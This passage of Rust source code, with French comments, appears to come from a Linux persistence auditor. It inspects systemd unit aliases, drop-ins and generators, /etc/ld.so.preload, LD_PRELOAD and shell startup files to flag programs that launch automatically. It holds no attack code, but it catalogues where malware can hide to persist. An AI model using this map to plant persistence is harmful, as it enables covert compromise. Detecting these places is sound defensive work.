    let (Ok(texte), Some(_)) = (std::str::from_utf8(&lu.octets), f.to_str()) else {
        return Err(octet_refuse(&montre()));
    };
    if let Some(d) = directive_refusee(texte) {
        return Err(refus_directive(&montre(), &d));
    }
    Ok((temoins::etat_du_contenant(f, &lu.octets)?, texte.to_string()))
}

/// Au plus autant de noms pour une unité (elle et ses alias) : au-delà, la chaîne est trop longue pour se suivre.
const ALIAS_MAX: usize = 32;

/// L'unité `nom` et chacun de ses alias, jusqu'au bout : un lien d'un dossier d'unités vers elle sous un autre nom,
/// ou vers un de ses alias (« alias2 -> alias -> rappel ») ; systemd applique aussi les ajouts posés sous chacun de
/// ces noms, jusque dans le dossier de la session (campagne E, F5 ; vérification, N6). `vraie` : le fichier de
/// l'unité que systemd lance. `Err` : un nom qui n'est pas de l'UTF-8, un lien qui boucle, ou trop d'alias.
fn alias_de(
    r: &Releveur,
    dossiers: &[std::path::PathBuf],
    nom: &str,
    vraie: Option<&Path>,
) -> Result<Vec<String>, temoins::Refus> {
    let vraie = vraie.and_then(|f| std::fs::canonicalize(f).ok());
    // Chaque lien des dossiers d'unités : son nom, son chemin, le nom vers lequel il mène.
    let mut liens: Vec<(String, std::path::PathBuf, Option<std::ffi::OsString>)> = Vec::new();
    for d in dossiers {
        for e in std::fs::read_dir(d).into_iter().flatten().flatten() {
            let n = e.file_name();
            // Un nom qui n'est pas de l'UTF-8 ne se compare pas : un alias ainsi nommé échapperait (F1).
            let Some(n) = n.to_str() else {
                return Err(octet_refuse(&crate::ui::affichable(&r.montre(&e.path()))));
            };
            let Ok(vers) = std::fs::read_link(e.path()) else {
                continue;
            };
            liens.push((
                n.to_string(),
                e.path(),
                vers.file_name().map(std::ffi::OsStr::to_os_string),
            ));
        }
    }
    // L'ordre des noms, pas celui du système de fichiers : un même refus quel que soit le disque.
    liens.sort();
    let mut noms = vec![nom.to_string()];
    // Jusqu'au point fixe : chaque tour ajoute au moins un nom, ou s'arrête ; au plus un tour par lien.
    loop {
        let mut ajoute = false;
        for (n, chemin, vers) in &liens {
            if noms.contains(n) {
                continue;
            }
            let meme_nom = vers
                .as_ref()
                .and_then(|v| v.to_str())
                .is_some_and(|v| noms.iter().any(|x| x == v));
            let meme_fichier = match (&vraie, std::fs::canonicalize(chemin)) {
                (_, Err(e)) if e.raw_os_error() == Some(libc::ELOOP) => {
                    return Err(temoins::Refus(trf!(
                        "{} est un lien qui boucle",
                        "{} is a link that loops",
                        crate::ui::affichable(&r.montre(chemin))
                    )));
                }
                (Some(v), Ok(c)) => c == *v,
                _ => false,
            };
            if meme_nom || meme_fichier {
                if noms.len() >= ALIAS_MAX {
                    return Err(temoins::Refus(trf!(
                        "{} a plus de {ALIAS_MAX} alias : la chaîne est trop longue pour se suivre",
                        "{} has more than {ALIAS_MAX} aliases: the chain is too long to follow",
                        crate::ui::affichable(nom)
                    )));
                }
                noms.push(n.clone());
                ajoute = true;
            }
        }
        if !ajoute {
            return Ok(noms);
        }
    }
}

fn refus_directive(fichier: &str, directive: &str) -> temoins::Refus {
    temoins::Refus(trf!(
        "{fichier} : « {directive} » est hors de la courte liste de ce qui se déclare normal dans une unité (décrire, ordonner, relancer, lignes Exec liées) : ce qu'elle change ne se lie pas",
        "{fichier}: “{directive}” is outside the short list of what can be declared normal in a unit (describe, order, restart, bound Exec lines): what it changes cannot be bound"
    ))
}

/// Pour la ligne `ligne` de l'unité systemd `fichier` (dont `texte` est le contenu lu ; `None` : chaque ligne Exec du
/// fichier est déjà liée par l'appelant) : ce qui change ce que l'unité
/// lance sans toucher à la ligne. Refusé : une unité du même nom dans un dossier qui passe avant, une directive hors
/// de la liste fermée (`directive_refusee`), trop d'ajouts. Lié : chaque fichier d'ajout (drop-in) de chaque dossier
/// de systemd, pour une ligne d'un ajout l'unité elle-même, et ce que lance chaque autre ligne Exec*= de l'unité et
/// de ses ajouts (ExecStartPre=, ExecStop=…), montrée avec ce qu'elle lance : la ligne acceptée n'est pas la seule
/// que l'unité exécute (deuxième vérification de la campagne E, P2).
fn unite(
    r: &mut Releveur,
    fichier: &Path,
    texte: &str,
    utilisateur: bool,
    ligne: Option<&str>,
) -> Result<Vec<(String, temoins::Etat)>, temoins::Refus> {
    if let Some(d) = directive_refusee(texte) {
        return Err(refus_directive(&crate::ui::affichable(&r.montre(fichier)), &d));
    }
    let parent = fichier.parent().unwrap_or(Path::new("/"));
    let nom_du_parent = parent.file_name().map(|n| n.to_string_lossy().into_owned());
    let (nom, dossier, ajout) = match nom_du_parent.as_deref().and_then(|n| n.strip_suffix(".d")) {
        Some(n) => (n.to_string(), parent.parent().unwrap_or(Path::new("/")), true),
        None => (
            fichier
                .file_name()
                .map(|n| n.to_string_lossy().into_owned())
                .unwrap_or_default(),
            parent,
            false,
        ),
    };
    let dossiers = dossiers_d_unites(r, utilisateur)?;
    let mut lies = Vec::new();
    // Chaque texte de l'unité telle que systemd l'assemble : le fichier de la ligne, l'unité d'un ajout, les ajouts.
    let mut textes: Vec<(std::path::PathBuf, String)> = vec![(fichier.to_path_buf(), texte.to_string())];
    // L'unité que systemd lance : la première de ce nom dans l'ordre de ses dossiers.
    let premiere = dossiers
        .iter()
        .find(|d| std::fs::symlink_metadata(d.join(&nom)).is_ok());
    if !ajout {
        if let Some(d) = premiere.filter(|d| d.as_path() != dossier) {
            return Err(temoins::Refus(trf!(
                "une unité du même nom dans {} passe avant {} : c'est elle que systemd lance",
                "a unit of the same name in {} takes precedence over {}: that is the one systemd starts",
                crate::ui::affichable(&r.montre(d)),
                crate::ui::affichable(&r.montre(fichier))
            )));
        }
    } else if let Some(d) = premiere {
        let f = d.join(&nom);
        let (etat, t) = lire_ajout(r, &f)?;
        lies.push((r.montre(&f), etat));
        textes.push((f, t));
    }
    let mut noms = Vec::new();
    for n in alias_de(r, &dossiers, &nom, premiere.map(|d| d.join(&nom)).as_deref())? {
        noms.extend(ajouts_de(&n));
    }
    noms.sort();
    noms.dedup();
    // Une ligne d'un gabarit (« a@.service ») vaut pour chaque instance : leurs ajouts (« a@x.service.d ») aussi.
    let instances = nom
        .rsplit_once('.')
        .and_then(|(b, g)| b.strip_suffix('@').map(|b| (format!("{b}@"), format!(".{g}.d"))));
    let illisible = |d: &Path, e: std::io::Error| {
        temoins::Refus(trf!(
            "{} ne se lit pas ({e})",
            "{} cannot be read ({e})",
            crate::ui::affichable(&r.montre(d))
        ))
    };
    let mut ajouts = Vec::new();
    for d in &dossiers {
        let entrees = match std::fs::read_dir(d) {
            Ok(e) => e,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => continue,
            Err(e) => return Err(illisible(d, e)),
        };
        for e in entrees.flatten() {
            let n = e.file_name().to_string_lossy().into_owned();
            let s_applique = noms.contains(&n)
                || instances
                    .as_ref()
                    .is_some_and(|(debut, fin)| n.starts_with(debut.as_str()) && n.ends_with(fin.as_str()));
            if !s_applique || !std::fs::metadata(e.path()).is_ok_and(|m| m.is_dir()) {
                continue;
            }
            for c in std::fs::read_dir(e.path())
                .map_err(|x| illisible(&e.path(), x))?
                .flatten()
            {
                if c.file_name().to_string_lossy().ends_with(".conf") {
                    ajouts.push(c.path());
                }
            }
        }
    }
    ajouts.sort();
    ajouts.dedup();
    ajouts.retain(|a| a != fichier);
    if ajouts.len() > AJOUTS_MAX {
        return Err(temoins::Refus(trf!(
            "{} fichiers d'ajout pour cette unité, plus que les {AJOUTS_MAX} qui se relisent à chaque bilan",
            "{} drop-in files for this unit, more than the {AJOUTS_MAX} re-read at each check",
            ajouts.len()
        )));
    }
    for a in ajouts {
        let (etat, t) = lire_ajout(r, &a)?;
        lies.push((r.montre(&a), etat));
        textes.push((a, t));
    }
    let maison = r.maison.to_string_lossy().into_owned();
    let contexte = if utilisateur {
        designes::Contexte::Unite(Some(&maison))
    } else {
        designes::Contexte::Unite(None)
    };
    let signalee = ligne.map(|l| l.trim_matches([' ', '\t']));
    for (f, t) in &textes {
        for (_, commande, logique) in lignes_exec(t) {
            if f == fichier && signalee.is_none_or(|l| l == logique) {
                continue;
            }
            let d = designes::commande(&commande, contexte);
            let montree = crate::ui::couper(&crate::ui::affichable(&logique), 60);
            for (chemin, etat) in cibles(r, d, &logique, true)? {
                lies.push((format!("{montree} → {chemin}"), etat));
            }
        }
    }
    Ok(lies)
}

/// Le dossier personnel, en texte, pour déplier « %h/ » d'une unité de l'utilisateur.
fn maison_texte(t: &Lancements) -> String {
    t.r.maison.to_string_lossy().into_owned()
}

/// La ligne `l` (lue par `lines()`) telle qu'écrite dans `texte`, coupée au seul « \n » comme la relit le fils root.
fn telle_qu_ecrite(texte: &str, l: &str) -> String {
    texte
        .split('\n')
        .find(|r| r.strip_suffix('\r').unwrap_or(r) == l)
        .unwrap_or(l)
        .to_string()
}

/// Le fichier et la ligne à retirer, pour `Lancements::retraits`.
fn retrait(f: &Path, texte: &str, l: &str) -> Option<(String, String)> {
    Some((f.to_str()?.to_string(), telle_qu_ecrite(texte, l)))
}

/// /etc/ld.so.preload : chaque bibliothèque listée est chargée dans TOUS les programmes, root compris. Technique
/// classique des rootkits ; presque aucun système normal n'en a. Puis LD_PRELOAD et LD_AUDIT de cette session.
fn lire_prechargement(
    racine: &Path,
    variable: &impl Fn(&str) -> Option<std::ffi::OsString>,
    gestion: Option<Paquets>,
    t: &mut Lancements,
) {
    let preload = racine.join("etc/ld.so.preload");
    let h = t.r.maison.clone();
    if let Some(lu) = lire(&preload, &h, t) {
        // Coupée comme la coupe le chargeur : espace, tabulation, « : ».
        let libs: Vec<(usize, &str, &str)> = lu
            .texte
            .lines()
            .enumerate()
            .filter(|(_, l)| !commentaire(l))
            .flat_map(|(n, l)| {
                l.split([' ', '\t', ':'])
                    .filter(|m| !m.is_empty())
                    .map(move |lib| (n, l, lib))
            })
            .collect();
        for (n, ligne, lib) in libs {
            let connue = gestion.is_some_and(|g| g.possede(Path::new(lib)));
            t.sources.push(source_de("preload", lib));
            t.retraits.push(retrait(&preload, &lu.texte, ligne));
            let d = designes::bibliotheques(lib, designes::Liste::Fichier);
            let temoin = temoin_de_ligne(t, &preload, n, &lu, ligne, d, false, Sorte::Shell);
            t.temoins.push(temoin);
            // Écrit par qui a posé le préchargement (un rootkit, souvent) : montré rendu inoffensif.
            let lib = crate::ui::affichable(lib);
            if connue {
                t.suspects.push(trf!(
                    "/etc/ld.so.preload charge {lib} dans tous les programmes",
                    "/etc/ld.so.preload loads {lib} into every program"
                ));
            } else {
                t.critiques.push(trf!(
                    "/etc/ld.so.preload charge {lib} (hors paquet) dans tous les programmes",
                    "/etc/ld.so.preload loads {lib} (not from a package) into every program"
                ));
            }
        }
    }
    for var in ["LD_PRELOAD", "LD_AUDIT"] {
        if let Some(v) = variable(var).filter(|v| !v.is_empty()) {
            let valeur = v.to_string_lossy();
            t.sources.push(source_de(&format!("env:{var}"), &valeur));
            t.retraits.push(None);
            // Hors du périmètre déclarable : une variable de la session, sans fichier à lier.
            t.temoins.push(Err(hors_des_deux(&trf!(
                "{var} de cette session",
                "{var} of this session"
            ))));
            t.suspects.push(trf!(
                "{var}={} est défini pour cette session",
                "{var}={} is set for this session",
                crate::ui::affichable(&v.to_string_lossy())
            ));
        }
    }
}

/// Les fichiers de configuration des sessions (environnement, profils des shells, uwsm), du système puis du compte,
/// chacun avec sa sorte, qui vient du lieu où il est trouvé (X-1) ; et les dossiers où leurs lecteurs cherchent qui
/// ne se lisent pas, que le bilan ne dit pas déjà (S-3).
fn fichiers_de_configuration(r: &Releveur) -> (Vec<(std::path::PathBuf, Variables)>, Vec<std::path::PathBuf>) {
    let h = &r.maison;
    let etc = |chemin: &str| r.racine.join(chemin);
    let shell = |f: std::path::PathBuf| (f, Variables::Shell);
    let cles = |f: std::path::PathBuf| (f, Variables::Cles);
    let systemd = |f: std::path::PathBuf| (f, Variables::Systemd);
    let mut configuration: Vec<(std::path::PathBuf, Variables)> = vec![cles(etc("etc/environment"))];
    configuration.extend(
        [
            "etc/profile",
            "etc/bash.bashrc",
            "etc/zsh/zshenv",
            "etc/zsh/zprofile",
            "etc/zsh/zshrc",
            "etc/zsh/zlogin",
            "etc/fish/config.fish",
        ]
        .iter()
        .map(|c| shell(etc(c))),
    );
    configuration.extend(
        fichiers_de(&etc("etc/profile.d"), &["sh", "zsh"])
            .into_iter()
            .map(shell),
    );
    configuration.extend(fichiers_de(&etc("etc/environment.d"), &["conf"]).into_iter().map(cles));
    configuration.extend(fichiers_de(&etc("etc/fish/conf.d"), &["fish"]).into_iter().map(shell));
    // ~/.bash_login, ~/.zlogin et fish aussi (vérification de la campagne E) : chacun lit du code à l'ouverture.
    configuration.extend(
        [
            ".profile",
            ".bash_profile",
            ".bash_login",
            ".bashrc",
            ".zshrc",
            ".zshenv",
            ".zprofile",
            ".zlogin",
            ".zlogout",
            ".bash_logout",
            ".xprofile",
            ".xsessionrc",
            ".config/fish/config.fish",
        ]
        .iter()
        .map(|f| shell(h.join(f))),
    );
    configuration.extend(
        fichiers_de(&h.join(".config/fish/conf.d"), &["fish"])
            .into_iter()
            .map(shell),
    );
    if let Some(z) = &r.zdot {
        for f in [".zshenv", ".zprofile", ".zshrc", ".zlogin", ".zlogout"] {
            configuration.push(shell(r.sous(&z.join(f))));
        }
    }
    if let Some(c) = &r.config {
        configuration.push(shell(r.sous(&c.join("fish/config.fish"))));
        configuration.extend(
            fichiers_de(&r.sous(&c.join("fish/conf.d")), &["fish"])
                .into_iter()
                .map(shell),
        );
    }
    configuration.extend(
        fichiers_de(&h.join(".config/environment.d"), &["conf"])
            .into_iter()
            .map(cles),
    );
    // L'environnement que le gestionnaire de systemd du compte donne à chaque unité (relecture adverse 2, N8).
    configuration.push(systemd(etc("etc/systemd/user.conf")));
    configuration.extend(
        fichiers_de(&etc("etc/systemd/user.conf.d"), &["conf"])
            .into_iter()
            .map(systemd),
    );
    configuration.push(systemd(h.join(".config/systemd/user.conf")));
    configuration.extend(
        fichiers_de(&h.join(".config/systemd/user.conf.d"), &["conf"])
            .into_iter()
            .map(systemd),
    );
    configuration.extend(
        fichiers_de(&h.join(".config/uwsm"), &["sh", "conf"])
            .into_iter()
            .map(shell),
    );
    // L-2 (campagne 0.95, angle lecture) : uwsm lit aussi chaque fichier de « env.d » et « env-<bureau>.d », quelle
    // que soit son extension (uwsm 0.27, prepare-env.sh, `source_dir` : sauf « *.bak », « *~ »…, lus ici quand même :
    // un fichier de trop se lit). S-4 (re-contrôle 2 0.95) : par la même liste que sous tout autre dossier où uwsm
    // cherche (`fichiers_d_uwsm`, liens suivis comme uwsm les suit), et ses dossiers qui ne se lisent pas sont dits
    // (avant, une lecture ratée ici se taisait). Ceux en « .sh » ou « .conf », déjà pris plus haut, ne se jugent
    // qu'une fois.
    let mut illisibles_ici = Vec::new();
    for f in fichiers_d_uwsm(&h.join(".config/uwsm"), &mut illisibles_ici) {
        if !configuration.iter().any(|(c, _)| *c == f) {
            configuration.push(shell(f));
        }
    }
    // R-4 (re-contrôle 0.95, angle lecture) : les mêmes lecteurs cherchent ailleurs que dans ~/.config : sous le
    // XDG_CONFIG_HOME de la session, sous un XDG_CONFIG_HOME ou XDG_CONFIG_DIRS posé au gestionnaire de systemd du
    // compte, et uwsm sous chaque XDG_CONFIG_DIRS et XDG_DATA_DIRS (uwsm 0.27, prepare-env.sh). La liste est celle de
    // la sauvegarde (`fichiers_du_gestionnaire`) : ses fichiers que le compte peut changer (S-3 plus bas) qui ne sont
    // pas déjà jugés, chacun selon le format du dossier où il est trouvé (X-1). ~/.config garde sa liste d'avant ;
    // ~/.pam_environment ne se juge pas ici (comme avant). Les dossiers d'uwsm : `dossiers_d_uwsm`, les mêmes que la
    // sauvegarde (V-3).
    let (ailleurs, illisibles) = fichiers_du_gestionnaire(r, &configs_posees(&r.gestionnaire), &dossiers_d_uwsm(r));
    let deja_lus = [
        ".config/uwsm",
        ".config/environment.d",
        ".config/systemd",
        ".pam_environment",
    ]
    .map(|d| h.join(d));
    // S-3 (re-contrôle 2 0.95, angle lecture) : « du compte » veut dire « que le compte peut changer », pas « sous son
    // dossier personnel ». Un fichier lu ailleurs (un XDG_DATA_DIRS dans /var/tmp, un disque amovible, un dossier du
    // système ouvert à tous) se juge aussi dès que root n'est pas seul à pouvoir le changer, lui ou un dossier de son
    // chemin réel, ou que ses droits ne se jugent pas (`programme_de_root_seul`, la même règle que la sauvegarde).
    let mut ailleurs: Vec<(std::path::PathBuf, Variables)> = ailleurs
        .into_iter()
        .filter(|(f, du_compte, _)| {
            (*du_compte || !programme_de_root_seul(&r.racine, f)) && !deja_lus.iter().any(|d| f.starts_with(d))
        })
        .map(|(f, _, sorte)| (f, sorte))
        .collect();
    // Dans l'ordre des noms, comme plus haut.
    ailleurs.sort_by(|a, b| a.0.cmp(&b.0));
    for (f, sorte) in ailleurs {
        if !configuration.iter().any(|(c, _)| *c == f) {
            configuration.push((f, sorte));
        }
    }
    // Les dossiers de cette liste qui ne se lisent pas, sauf ceux que le bilan dit déjà (`gestionnaire_non_resolu`) :
    // ce qu'ils posent n'est pas jugé, c'est dit (non vérifié), jamais tu.
    let mut illisibles: Vec<std::path::PathBuf> = illisibles_ici
        .into_iter()
        .chain(illisibles)
        .filter(|d| !r.gestionnaire_non_resolu.iter().any(|(x, _)| x == d))
        .collect();
    illisibles.sort();
    illisibles.dedup();
    (configuration, illisibles)
}

/// L'identité du compte qui lit (celle de /proc/self) ; dans les essais, celle qu'ils choisissent (1000 sinon).
#[cfg_attr(test, allow(clippy::unnecessary_wraps))]
fn uid_du_compte() -> Option<u32> {
    #[cfg(test)]
    {
        Some(tests::UID_DU_COMPTE.with(std::cell::Cell::get))
    }
    #[cfg(not(test))]
    {
        use std::os::unix::fs::MetadataExt as _;
        std::fs::metadata("/proc/self").ok().map(|m| m.uid())
    }
}

/// Les dossiers d'unités que systemd lit en plus des habituels (`Ajout::Dossier`) : ~/.config/systemd/user.attached
/// (et celui d'un XDG_CONFIG_HOME déplacé), chaque XDG_CONFIG_DIRS et XDG_DATA_DIRS que le compte peut changer (sous
/// son dossier personnel, ou pas à root seul), et ceux du dossier de session de systemd quand XDG_RUNTIME_DIR mène
/// ailleurs. Tels que lus sous la racine.
fn dossiers_ajoutes(r: &Releveur) -> Vec<std::path::PathBuf> {
    let mut dossiers = vec![r.maison.join(".config/systemd/user.attached")];
    if let Some(c) = &r.config {
        dossiers.push(r.sous(&c.join("systemd/user.attached")));
    }
    for d in r.config_systeme.iter().chain(&r.donnees_systeme) {
        let lu = r.sous(&d.join("systemd/user"));
        let habituel = [".config/systemd/user", ".local/share/systemd/user"]
            .iter()
            .any(|h| lu == r.maison.join(h));
        if !habituel && (lu.starts_with(&r.maison) || !de_root_seul(&lu)) {
            dossiers.push(lu);
        }
    }
    // Ceux que posent les fichiers du gestionnaire de systemd du compte (V-1), hors des habituels et de ceux à root
    // seul.
    let habituels = [
        ".config/systemd/user",
        ".config/systemd/user.control",
        ".local/share/systemd/user",
    ]
    .map(|h| r.maison.join(h));
    for (nom, c) in [
        ("SYSTEMD_UNIT_PATH", ""),
        ("XDG_CONFIG_HOME", "systemd/user.control"),
        ("XDG_CONFIG_HOME", "systemd/user"),
        ("XDG_CONFIG_HOME", "systemd/user.attached"),
        ("XDG_CONFIG_DIRS", "systemd/user"),
        ("XDG_DATA_HOME", "systemd/user"),
        ("XDG_DATA_DIRS", "systemd/user"),
    ] {
        for lu in du_gestionnaire(r, nom, c) {
            if !habituels.contains(&lu) && (lu.starts_with(&r.maison) || !de_root_seul(&lu)) {
                dossiers.push(lu);
            }
        }
    }
    if let Some(autre) = &r.session_de_systemd {
        dossiers.extend(DOSSIERS_DE_LA_SESSION.iter().map(|d| r.sous(&autre.join(d))));
    }
    let mut vus = std::collections::BTreeSet::new();
    dossiers.retain(|d| vus.insert(d.clone()));
    dossiers
}

/// Les dossiers d'unités de l'utilisateur sous le dossier de la session (XDG_RUNTIME_DIR), dans l'ordre de systemd.
const DOSSIERS_DE_LA_SESSION: [&str; 7] = [
    "systemd/user.control",
    "systemd/transient",
    "systemd/generator.early",
    "systemd/user",
    "systemd/user.attached",
    "systemd/generator",
    "systemd/generator.late",
];

/// Un dossier où se rangent des lancements, qui ne se lit pas : une ligne de l'alerte, non vérifié.
/// Une ligne de l'alerte qui ne vient pas d'une ligne d'un fichier (un lien, une inclusion non suivie, un dossier de
/// session à part) : sa `source` (sans langue), ce qui se montre (`suspect`), et pourquoi elle ne se déclare pas.
fn constat_sans_ligne(t: &mut Lancements, source: &str, suspect: String, refus: String) {
    t.sources.push(source_de("lancements", source));
    t.retraits.push(None);
    t.temoins.push(Err(temoins::Refus(refus)));
    t.suspects.push(suspect);
}

fn dossier_illisible(t: &mut Lancements, chemin: &Path, e: &std::io::Error) {
    let montre = crate::ui::affichable(&t.r.montre(chemin));
    t.sources
        .push(source_de("maison", &format!("illisible {}", t.r.montre(chemin))));
    t.retraits.push(None);
    t.temoins.push(Err(temoins::Refus(trf!(
        "{montre} ne se lit pas : ce qu'il lance n'est pas vérifié",
        "{montre} cannot be read: what it starts is not checked"
    ))));
    t.suspects.push(trf!(
        "{montre} ne se lit pas ({e}) : ce qu'il lance n'est pas vérifié",
        "{montre} cannot be read ({e}): what it starts is not checked"
    ));
}

/// Au plus autant de programmes lus dans un dossier de générateurs ; au-delà, le reste n'est pas vérifié (dit).
const GENERATEURS_MAX: usize = 256;

/// Les générateurs de systemd des sessions : des programmes que le gestionnaire de la session lance à chaque
/// démarrage, avec les droits du compte, avant toute unité (ceux de « user-environment-generators » posent en plus
/// les variables de toutes les unités). Dans un dossier du compte (~/.config/systemd/user-generators, et
/// user-environment-generators, ou sous un XDG_CONFIG_HOME déplacé), tout programme est levé : rien de normal ne s'y
/// range (systemd 262 ne lit pas ces dossiers-là, une autre version ou un autre gestionnaire pourrait). Dans un
/// dossier du système (/run, /etc, /usr/local/lib, /usr/lib), seul ce que le compte a pu poser ou changer est levé
/// (`pose_par_le_compte`) : ceux des paquets, à root, ne lèvent rien. Un lien vers /dev/null (un générateur masqué) ne
/// lance rien. Rien de tout cela ne se déclare normal.
fn juger_generateurs(t: &mut Lancements) {
    const NOMS: [&str; 2] = ["user-generators", "user-environment-generators"];
    let mut dossiers: Vec<(std::path::PathBuf, bool)> = Vec::new();
    let configs = std::iter::once(t.r.maison.join(".config")).chain(t.r.config.iter().map(|c| t.r.sous(c)));
    for c in configs {
        dossiers.extend(NOMS.iter().map(|n| (c.join("systemd").join(n), true)));
    }
    for base in [
        "/run/systemd",
        "/etc/systemd",
        "/usr/local/lib/systemd",
        "/usr/lib/systemd",
    ] {
        dossiers.extend(NOMS.iter().map(|n| (t.r.sous(&Path::new(base).join(n)), false)));
    }
    dossiers.dedup();
    let moi = {
        use std::os::unix::fs::MetadataExt as _;
        std::fs::metadata("/proc/self").map_or(u32::MAX, |m| m.uid())
    };
    let sans_traduction = uid_sans_traduction(&std::fs::read_to_string("/proc/self/uid_map").unwrap_or_default());
    for (dossier, du_compte) in dossiers {
        let entrees = match std::fs::read_dir(&dossier) {
            Ok(e) => e,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => continue,
            Err(e) => {
                dossier_illisible(t, &dossier, &e);
                continue;
            }
        };
        let mut chemins: Vec<std::path::PathBuf> = entrees.flatten().map(|e| e.path()).collect();
        chemins.sort();
        if chemins.len() > GENERATEURS_MAX {
            let e = std::io::Error::other(trf!(
                "plus de {GENERATEURS_MAX} fichiers",
                "more than {GENERATEURS_MAX} files"
            ));
            dossier_illisible(t, &dossier, &e);
            chemins.truncate(GENERATEURS_MAX);
        }
        for p in chemins {
            if let Some(raison) = generateur_suspect(&p, &dossier, du_compte, moi, sans_traduction) {
                let ou = crate::ui::affichable(&court(&p, &t.r.maison));
                t.sources.push(source_de(
                    &crate::modele::id::chemin(&p.to_string_lossy()),
                    "générateur",
                ));
                t.retraits.push(None);
                let refus = hors_du_perimetre(&t.r, &p, 0, "", Sorte::Ajoutee(Ajout::Generateur), true)
                    .unwrap_or_else(|| refus_ajoute(Ajout::Generateur, &ou, 0, ""));
                t.temoins.push(Err(refus));
                t.suspects.push(trf!("{ou} : {raison}", "{ou}: {raison}"));
            }
        }
    }
}

/// Pourquoi le fichier `p` du dossier de générateurs `dossier` se lève, ou `None` : pas un programme (ni fichier ni
/// lien vers un fichier exécutable), masqué (lien vers /dev/null), ou d'un paquet dans un dossier du système.
fn generateur_suspect(
    p: &Path,
    dossier: &Path,
    du_compte: bool,
    moi: u32,
    sans_traduction: bool,
) -> Option<&'static str> {
    use std::os::unix::fs::MetadataExt as _;
    if std::fs::read_link(p).is_ok_and(|c| c == Path::new("/dev/null")) {
        return None;
    }
    let lien = std::fs::symlink_metadata(p).ok()?;
    let cible = std::fs::metadata(p).ok()?;
    if !cible.is_file() || cible.mode() & 0o111 == 0 {
        return None;
    }
    if du_compte {
        return Some(tr!(
            "programme dans un dossier de générateurs de systemd du compte : rien de normal ne s'y range (systemd le lancerait à chaque démarrage de la session, avec les droits du compte)",
            "program in an account systemd generator folder: nothing normal goes there (systemd would start it at each session start, with the account's rights)"
        ));
    }
    // Le lien lui-même (sa permission ne dit rien), le programme, son dossier réel et le dossier lu.
    let mut proprietes = vec![(lien.uid(), if lien.is_symlink() { 0 } else { lien.mode() })];
    proprietes.push((cible.uid(), cible.mode()));
    let reel = std::fs::canonicalize(p).ok()?;
    for d in [reel.parent(), Some(dossier)].into_iter().flatten() {
        let Ok(m) = std::fs::metadata(d) else {
            return Some(tr!(
                "générateur de systemd des sessions dont le dossier ne se lit pas : non vérifié",
                "session systemd generator whose folder cannot be read: not checked"
            ));
        };
        proprietes.push((m.uid(), m.mode()));
    }
    pose_par_le_compte(&proprietes, moi, sans_traduction).then_some(tr!(
        "générateur de systemd des sessions que le compte a pu poser ou changer (lui, son lien ou son dossier n'est pas à root seul) : systemd le lance à chaque démarrage de la session",
        "session systemd generator the account could have placed or changed (it, its link or its folder is not root-only): systemd starts it at each session start"
    ))
}

/// Un des fichiers (`proprietes` : propriétaire et permissions de chacun) a pu être posé ou changé par le compte :
/// écrit par le groupe ou les autres, ou pas à root. Dans un espace de noms d'utilisateurs (`sans_traduction` faux),
/// root se voit sous une autre identité et le compte peut se voir root : seul ce qui appartient à l'identité de ce
/// processus (`moi`) compte alors (limite écrite au modèle de menace).
fn pose_par_le_compte(proprietes: &[(u32, u32)], moi: u32, sans_traduction: bool) -> bool {
    proprietes
        .iter()
        .any(|&(uid, mode)| mode & 0o022 != 0 || if sans_traduction { uid != 0 } else { uid == moi })
}

/// Ce que lit le bilan des lancements (`fichiers_de_demarrage`).
#[derive(Default)]
struct Demarrage {
    /// Les fichiers dont des lignes lancent des programmes (services, démarrage de session, Hyprland).
    fichiers: Vec<std::path::PathBuf>,
    /// Ceux de Hyprland à part, modules d'Omarchy compris : ils sont aussi des fichiers de configuration.
    hypr: Vec<std::path::PathBuf>,
    /// Les dossiers « *.d » d'unités qui sont des liens vers un dossier (relecture adverse, C4).
    liens: Vec<std::path::PathBuf>,
    /// Ce que le parcours des dossiers de Hyprland et des modules d'Omarchy a dit (liens, profondeur).
    parcours: Parcours,
    /// Les modules Lua d'Omarchy lus hors de ~/.config/hypr.
    modules: Vec<std::path::PathBuf>,
    /// Ceux d'entre eux qui passent avant un module du même nom (d'Omarchy ou de ~/.config/hypr).
    masques: Vec<std::path::PathBuf>,
}

/// Les dossiers où le chargeur d'Omarchy (/usr/share/omarchy/default/hypr/bootstrap.lua, toggles.lua,
/// workspace-layouts.lua, omarchy.lua) prend des modules Lua hors de ~/.config/hypr, sous le dossier personnel, et
/// s'ils en masquent un autre. package.path y met « ~/.local/state/?.lua » avant « ~/.config/?.lua », avant
/// /usr/share/omarchy : « require("hypr.x") » prend ~/.local/state/hypr/x.lua avant ~/.config/hypr/x.lua,
/// « require("default.hypr.x") » prend ~/.local/state/default/hypr/x.lua ou ~/.config/default/hypr/x.lua avant
/// l'original ; le thème (« omarchy.current.theme.* »), les bascules et les dispositions s'y lisent aussi.
const MODULES_D_OMARCHY: [(&str, bool); 7] = [
    (".local/state/default", true),
    (".local/state/hypr", true),
    (".config/default", true),
    (".local/state/omarchy/current/theme", false),
    (".config/omarchy/current/theme", false),
    (".local/state/omarchy/toggles/hypr", false),
    (".local/state/omarchy/workspace-layouts", false),
];

/// Les fichiers dont des lignes lancent des programmes (services, démarrage de session, Hyprland), ceux de
/// Hyprland à part, et ce que leur parcours a dit (`Demarrage`).
fn fichiers_de_demarrage(r: &Releveur) -> Demarrage {
    // Les ajouts (« .d/*.conf ») d'un .mount, .target… se lisent aussi : leurs lignes Exec ou leurs dépendances
    // lancent (relecture adverse, B5).
    const UNITES: [&str; 11] = [
        "service",
        "timer",
        "socket",
        "path",
        "conf",
        "mount",
        "automount",
        "swap",
        "target",
        "slice",
        "scope",
    ];
    let h = &r.maison;
    let etc = |chemin: &str| r.racine.join(chemin);
    let mut demarrage = Vec::new();
    let mut liens = Vec::new();
    // Les dossiers d'unités du système et des comptes : les liens y sont des alias ou des activations, vers des
    // unités lues ailleurs.
    for d in ["etc/systemd/system", "etc/systemd/user"] {
        let mut unites = fichiers_et_liens(&etc(d), &UNITES, &mut liens);
        unites.retain(|p| !p.is_symlink());
        demarrage.extend(unites);
    }
    // Ceux du compte, dont user.control (prioritaire) et ~/.local/share (installées par le compte).
    for d in [
        ".config/systemd/user",
        ".config/systemd/user.control",
        ".local/share/systemd/user",
    ] {
        demarrage.extend(fichiers_et_liens(&h.join(d), &UNITES, &mut liens));
    }
    demarrage.extend(fichiers_de(&h.join(".config/autostart"), &["desktop"]));
    demarrage.extend(fichiers_de(&etc("etc/xdg/autostart"), &["desktop"]));
    let mut parcours = Parcours::default();
